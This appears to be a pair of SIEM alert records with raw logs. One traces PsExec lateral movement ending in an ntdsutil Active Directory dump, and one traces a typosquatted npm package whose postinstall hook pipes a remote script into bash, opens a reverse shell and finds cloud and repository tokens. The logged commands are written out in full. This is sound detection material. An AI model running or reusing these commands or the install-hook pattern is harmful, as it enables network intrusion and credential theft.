siem_event.title: PsExec lateral spread from compromised workstation

2026-03-21T05:22:14Z SRV-APP-01 PSEXESVC.exe spawned cmd.exe (PID 4412) as CORP\svc-deploy
2026-03-21T05:22:18Z WS-DEV-017 PsExec.exe \\SRV-APP-02 -u CORP\svc-deploy -p *** cmd.exe /c net user /domain
2026-03-21T05:22:25Z WS-DEV-017 PsExec.exe \\SRV-DB-01 -u CORP\svc-deploy -p *** cmd.exe /c dir \\SRV-DB-01\c$\backup\
2026-03-21T05:22:30Z WS-DEV-017 PsExec.exe \\DC-01 -u CORP\svc-deploy -p *** cmd.exe /c ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntds_dump" q q
2026-03-21T05:22:35Z DC-01 Event 4672: Special privileges assigned to CORP\svc-deploy
5 hosts contacted in 25 seconds via PsExec. svc-deploy is a service account — no interactive login expected. ntdsutil on DC-01 indicates Active Directory database extraction attempt.

siem_event.title: Backdoored npm package deployed to production
siem_event.raw_log:
2026-03-21T10:05:33Z SRV-CI-RUNNER-03 npm install: added lodash-utils@2.1.4 (published 3 hours ago by npm user xz_maintainer)
2026-03-21T10:05:34Z SRV-CI-RUNNER-03 lodash-utils@2.1.4 postinstall script: node -e "require('child_process').exec('curl -s http://45.77.65.211:8443/init.sh|bash')"
2026-03-21T10:05:35Z SRV-CI-RUNNER-03 bash: curl -s http://45.77.65.211:8443/init.sh | bash
2026-03-21T10:05:36Z SRV-CI-RUNNER-03 init.sh: Downloading /tmp/.cache_worker from 45.77.65.211:8443
2026-03-21T10:05:37Z SRV-CI-RUNNER-03 /tmp/.cache_worker: Connecting to 45.77.65.211:4444 (reverse shell)
2026-03-21T10:05:38Z SRV-CI-RUNNER-03 /tmp/.cache_worker: Enumerating environment variables — AWS_ACCESS_KEY_ID, GITHUB_TOKEN, NPM_TOKEN found
Package lodash-utils is typosquat of lodash. Version 2.1.4 added postinstall hook absent in 2.1.3. Publisher xz_maintainer account created 24 hours ago. CI runner has access to production deployment credentials.
